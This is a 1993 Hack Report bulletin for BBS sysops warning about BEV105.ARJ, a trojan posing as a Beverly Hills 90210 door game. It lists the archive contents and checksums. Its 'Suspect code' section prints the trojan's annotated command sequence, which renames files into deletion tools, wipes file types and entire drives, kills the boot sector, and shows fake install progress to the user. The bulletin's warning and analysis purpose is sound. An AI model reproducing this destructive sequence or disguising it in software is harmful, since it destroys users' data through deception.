  =========================================================================
                                    ||
  From the files of The Hack Squad: ||  by Lee Jackson, Co-Moderator,
                                    ||  FidoNet International Echo SHAREWRE
          The Hack Report           ||  Volume 2, Number 3
         File Test Results          ||  Result Report Date: March 7, 1993
                                    ||
  =========================================================================
  
  *************************************************************************
  *                                                                       *
  *  The following test was performed by and the results are courtesy     *
  *     of Jeff White and Bill Logan of the Pueblo Group in Tuscon,       *
  *         Arizona.  Their assistance is greatly appreciated.            *
  *                                                                       *
  *************************************************************************


  File:        BEV105.ARJ
  Size:        79858
  Date/time:   1-15-93   5:09p

  Description:

  BEV is described by the scant documentation as a Beverly Hills 90210 
  Adventure DOOR game for WWIV BBSes.  It claims to have dialogue from the 
  actual TV show, and permission from The Fox Network to use such dialogue.

  =========================================================================

  Synopsis:

  Apparently this was a batch file compiled to an COM file.  It renames 
  several of the files included with the archive to programs and executes 
  them.  It is dependent on these programs to do the destruction.

  Running the INSTALL.COM program to begin installation produces the 
  following screen:

        Welcome to the 90210 Door Installation Program for WWIV
        Copyright 1992(c) Brian Deborus of Constalion BBS 1@2723

        This Program will Depact all the files neccesary to run
        the door, including the documentation to run the door.
        The door will run on all WWIV systems using CHAIN.TXT.
        The program will give you frequent updates on installation
        by means of a percentage.

        Please Make sure when you typed Install you did it in this format
        INSTALL [drive/path] of where you want the door.
        Strike any key when ready...

  But what is actually happening is outlined below:

  Renames DORINFO.DIR to IDCKILL.EXE
  Invokes IDCKILL to kill files on current drive with the extensions of:
    BAT, FON, COM, ICE, ZIP, ANS, SYS, SUB, DAT, ARJ, EXE, and C
  Renames DISK_1.VOL to BOOTKILL.EXE
  Invokes BOOTKILL to kill BOOT record on current drive
  Renames 90210.DIR to REBOOT.COM
  Invokes IDCKILL to delete *.* on C:, D:, and E: drives
  Invokes REBOOT.COM to reboot your computer after "installation"

  The author of this trojan added some "filler" to the archive by renaming 
  some common programs to .DIR files and including them with the archive 
  under the guise of being related to the DOOR game.  Examples:

  MAIN.DIR

  This is actually BBSBASE, a common program used by Sysops to keep BBS 
  lists.

  Screen cut:

             ﬂﬂﬂﬂ‹ ﬂﬂﬂﬂ‹   €           ﬂﬂﬂﬂ‹  ﬂﬂﬂﬂﬂ‹  €      ‹ﬂﬂﬂ
             € ‹‹ﬂ € ‹‹ﬂ   ﬂ‹‹         € ‹‹ﬂ  €    €  ﬂ‹‹    €
             €   € €   €      ﬂ‹       €   €  € ﬂﬂﬂ€     ﬂ‹  € ﬂﬂ
             €‹‹‹ﬂ €‹‹‹ﬂ  ‹‹‹‹‹ﬂ       €‹‹‹ﬂ  €    € ‹‹‹‹‹ﬂ  ﬂ‹‹‹

                              Version 1.00  (c) 1988
                              User Supported Software

         If  you are  an avid BBSer  like me, you  know  what  it feels
         like to  try and  organize  all  those  BBS  names and numbers
         that  you constantly  collect.  At first, I tried to use index
         cards, but that got really out of hand.
           So,  I wrote this  program to keep  track of those myriad of
         numbers  and names  that once collected on my desk.  The power
         of  this  program  is  simply amazing. I have included alot of
         extras in this program that would take for hours to do by hand
         I have  tried  to keep  it as  user  friendly as possible too.

                Written in Turbo Pascal Version 3.0 by Steve Lutz

                P R E S S   A N Y   K E Y   T O   C O N T I N U E

  CHAR.DIR

  This is evidently an auto-extract and/or install program for another 
  program.  The GENESIS.EXE file does not come with BEV105, so the program 
  just errors out.

  Screen cut:

        AutoLHarc 1.15 (c)Yoshi, 1988-1990.

        Extract from : 'GENESIS.EXE'
        Melting : 'GENESIS.COM'
        o...............................................

        Error In Archive.

  DOCS.DIR

  Unknown.  This is a program, but invoking it does not bring any response.

  =========================================================================

  Contents:

  ARJ 2.30 Copyright (c) 1990-92 Robert K Jung. Jan 19 1992 
  NOT REGISTERED for business, commercial, or government use.

  Processing archive: C:\SUSPECT\BEV105.ARJ
  Archive date      : 1993-01-15 17:10:04
  Sequence/Pathname/Comment
  Rev Host OS    Original Compressed Ratio DateTime modified CRC-32
  ============ ========== ========== ===== ================= ========
  001) DORINFO.DIR
   3  MS-DOS         4135       1996 0.483 92-08-28 18:27:52 4BE0E6FE
  002) README.1ST
   3  MS-DOS         1414        750 0.530 93-01-15 17:09:38 9A392726
  003) 90210.DIR
   3  MS-DOS           16         16 1.000 92-08-28 23:07:14 6D232072
  004) CHAR.DIR
   3  MS-DOS        21108      16675 0.790 92-08-28 19:02:54 8B911883
  005) MAIN.DIR
   3  MS-DOS        63733      30221 0.474 92-08-28 19:02:40 FE66BA29
  006) DISK_1.VOL
   3  MS-DOS           96         96 1.000 92-08-28 02:03:36 6ABF751F
  007) DOCS.DIR
   3  MS-DOS        39408      25166 0.639 92-08-28 16:58:50 0230EF50
  008) INSTALL.COM
   3  MS-DOS        41088       3343 0.081 92-08-28 16:22:02 A5FEE2C8
  ============ ========== ========== =====
      8 files      170998      78263 0.458

  =========================================================================

  File Validations:

  File Name:  90210.dir    Size:  16        Date:  8-28-1992
  File Authentication:   Check Method 1 - 70EC    Check Method 2 - 0565

  File Name:  char.dir     Size:  21,108    Date:  8-28-1992
  File Authentication:   Check Method 1 - FF27    Check Method 2 - 0039

  File Name:  disk_1.vol   Size:  96        Date:  8-28-1992
  File Authentication:   Check Method 1 - AB28    Check Method 2 - 0510

  File Name:  docs.dir     Size:  39,408    Date:  8-28-1992
  File Authentication:   Check Method 1 - B9B0    Check Method 2 - 1C92

  File Name:  dorinfo.dir  Size:  4,135     Date:  8-28-1992
  File Authentication:   Check Method 1 - 8930    Check Method 2 - 0F58

  File Name:  install.com  Size:  41,088    Date:  8-28-1992
  File Authentication:   Check Method 1 - 6D5A    Check Method 2 - 1ED0

  File Name:  main.dir     Size:  63,733    Date:  8-28-1992
  File Authentication:   Check Method 1 - 5572    Check Method 2 - 0A7D

  File Name:  readme.1st   Size:  1,414     Date:  1-15-1993
  File Authentication:   Check Method 1 - B6DD    Check Method 2 - 1DEC

  =========================================================================

  Viral activity:  None detected

  =========================================================================

  Suspect code:

  Here is an extract directly from the INSTALL.COM file which shows the 
  path of destruction.  Comments were added by myself to point out what is 
  going on line-by-line.

  /C REN Dorinfo.dir idckill.exe <-- REN DORINFO.DIR to the IDCKILL 
                                     program
  IDCKILL *.bat [a]              <-- Kill all BAT files
  Exploding Files - (10%)        <-- Let user think installation is
                                     10% done
  IDCKILL *.fon [a]              <-- Kill any FON (phone) files
  IDCKILL *.com [a]              <-- Kill all COM files
  Exploding Files - (25%)        <-- Let user think installation is 
                                     25% done
  IDCKILL *.ice [a]              <-- Kill all ICE files
  IDCKILL *.zip [a]              <-- Kill all ZIP files
  Exploding Files - (40%)        <-- Let user think installation is 
                                     40% done
  IDCKILL *.ans [a]              <-- Kill all ANS files
  IDCKILL *.sys [a]              <-- Kill all SYS files
  IDCKILL *.sub [a]              <-- Kill all SUB files
  IDCKILL *.dat[a]               <-- Kill all DAT files
  Exploding Files - (50%)        <-- Let user think installation is 
                                     50% done
  IDCKILL *.arj [a]              <-- Kill all ARJ files
  IDCKILL        *.c [a]         <-- Kill all C files
  Exploding Files - (60%)        <-- Let user think installation is 
                                     60% done
  IDCKILL *.exe [a]              <-- Kill all EXE files
  Exploding Files - (85%)        <-- Let user think installation is 
                                     85% done
  /C REN DISK_1.VOL bootkill.com <-- REN DISK_1.VOL to the BOOTKILL 
                                     program
  BOOTKILL@                      <-- Execute BOOTKILL to kill 
                                     BOOT sector
  /C REN CHAR.DAT Genesis.EXE    <-- REN CHAR.DAT to the GENESIS.EXE
                                     program
  Exploding Files - (95%)        <-- Let user think installation is 
                                     95% done
  /C REN 90210.DIR reboot.com    <-- REN 90210.DIR to REBOOT.COM program
  Exploding Files (DONE!)        <-- Let user think file expansion is done
  Building Excutable Files.. Please Wait.. (May take up to 5 minutes)
  IDCKILL        *.* [a]         <-- Erase all of DRIVE C:
  /C c:
  IDCKILL        *.* [a]         <-- Erase all of DRIVE D:
  /C d:
  IDCKILL        *.* [a]         <-- Erase all of DRIVE E:
  /C e:
  IDCKILL        *.* [a]         <-- Erase all of current drive
  Program Finished... Beverly Hills 90210 door install complete!
  REBOOT@                        <-- Reboot computer

  =========================================================================
